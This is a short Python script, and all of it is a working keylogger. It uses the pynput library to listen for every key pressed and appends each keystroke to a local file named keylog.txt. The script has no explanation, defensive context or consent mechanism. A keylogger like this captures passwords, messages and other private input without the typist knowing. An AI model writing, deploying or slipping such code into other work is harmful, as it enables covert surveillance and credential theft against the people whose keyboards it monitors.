from pynput import keyboard

logger_file = open("keylog.txt", "a")

def on_press(key):
    try:
        logger_file.write(f"{key.char}\n")
    except AttributeError:
        logger_file.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()